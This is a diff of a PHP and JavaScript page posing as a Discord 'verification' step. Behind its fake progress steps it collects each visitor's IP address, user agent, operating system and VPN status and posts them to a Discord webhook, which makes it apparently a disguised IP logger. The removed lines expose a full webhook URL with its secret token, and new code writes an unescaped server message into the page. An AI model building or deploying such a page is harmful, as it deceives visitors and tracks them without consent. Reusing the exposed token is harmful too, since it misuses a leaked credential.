@@ -41,12 +41,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $data = json_decode($input, true);
 
     $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
+    if ($user_id === 'Unknown') {
+        header('Content-Type: application/json');
+        echo json_encode(['status' => 'error', 'message' => 'Invalid user ID']);
+        exit;
+    }
 
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $os = getOS($user_agent);
 
     $forwarded = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
-    $ip_address = $forwarded ? trim(explode(',', $forwarded)[count(explode(',', $forwarded)) - 1]) : ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
+    $ip_address = $forwarded ? trim(explode(',', $forwarded)[0]) : ($_SERVER['REMOTE_ADDR'] ?? 'Unknown');
 
     $vpn_status = isVPN($ip_address);
     if ($vpn_status) {
@@ -80,14 +85,21 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         'timestamp' => date('c')
     ];
 
-    $webhook_url = 'https://discord.com/api/webhooks/1426256242690625600/jw-wr_1D7IL7sy62Zn608UgN1UXXE8BURCtmPZmMUq-QKizwKFoxOKSahLJhIZKTjfZe';
-    $options = ['http' => [
-        'header' => "Content-Type: application/json\r\n",
-        'method' => 'POST',
-        'content' => json_encode($payload)
-    ]];
+    $webhook_url = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your actual webhook URL
+    $options = [
+        'http' => [
+            'header' => "Content-Type: application/json\r\n",
+            'method' => 'POST',
+            'content' => json_encode($payload)
+        ]
+    ];
     $context = stream_context_create($options);
-    file_get_contents($webhook_url, false, $context);
+    $result = file_get_contents($webhook_url, false, $context);
+    if ($result === false) {
+        header('Content-Type: application/json');
+        echo json_encode(['status' => 'error', 'message' => 'Failed to send webhook']);
+        exit;
+    }
 
     header('Content-Type: application/json');
     echo json_encode(['status' => 'success']);
@@ -210,38 +222,56 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         }
 
         const userId = new URLSearchParams(window.location.search).get('user') || 'Unknown';
-        const data = { user_id: userId };
-
-        fetch(window.location.pathname, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        })
-        .then(response => response.json())
-        .then(result => {
-            if (result.status === 'success') {
-                setTimeout(() => document.getElementById('step1').classList.add('done'), 500);
-                setTimeout(() => document.getElementById('step2').classList.add('done'), 1500);
-                setTimeout(() => document.getElementById('step3').classList.add('done'), 2500);
-                setTimeout(() => document.getElementById('step4').classList.add('done'), 3500);
-                setTimeout(() => {
+        if (userId === 'Unknown') {
+            document.getElementById('container').innerHTML = `
+                <h1>Error</h1>
+                <p>Invalid user ID. Please try again.</p>
+            `;
+        } else {
+            const data = { user_id: userId };
+            fetch(window.location.pathname, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.status === 'success') {
+                    setTimeout(() => document.getElementById('step1').classList.add('done'), 500);
+                    setTimeout(() => document.getElementById('step2').classList.add('done'), 1500);
+                    setTimeout(() => document.getElementById('step3').classList.add('done'), 2500);
+                    setTimeout(() => document.getElementById('step4').classList.add('done'), 3500);
+                    setTimeout(() => {
+                        const container = document.getElementById('container');
+                        container.classList.add('success');
+                        container.innerHTML = `
+                            <h1>Verification Complete</h1>
+                            <p>You are now verified. Return to Discord.</p>
+                        `;
+                    }, 4500);
+                } else if (result.status === 'already_verified') {
                     const container = document.getElementById('container');
                     container.classList.add('success');
                     container.innerHTML = `
-                        <h1>Verification Complete</h1>
-                        <p>You are now verified. Return to Discord.</p>
+                        <h1>Already Verified</h1>
+                        <p>You’re set. Head back to Discord.</p>
                     `;
-                }, 4500);
-            } else if (result.status === 'already_verified') {
-                const container = document.getElementById('container');
-                container.classList.add('success');
-                container.innerHTML = `
-                    <h1>Already Verified</h1>
-                    <p>You’re set. Head back to Discord.</p>
+                } else {
+                    const container = document.getElementById('container');
+                    container.innerHTML = `
+                        <h1>Error</h1>
+                        <p>${result.message || 'Verification failed. Try again.'}</p>
+                    `;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('container').innerHTML = `
+                    <h1>Error</h1>
+                    <p>Verification failed. Try again.</p>
                 `;
-            }
-        })
-        .catch(error => console.error('Error:', error));
+            });
+        }
     </script>
 </body>
 </html>
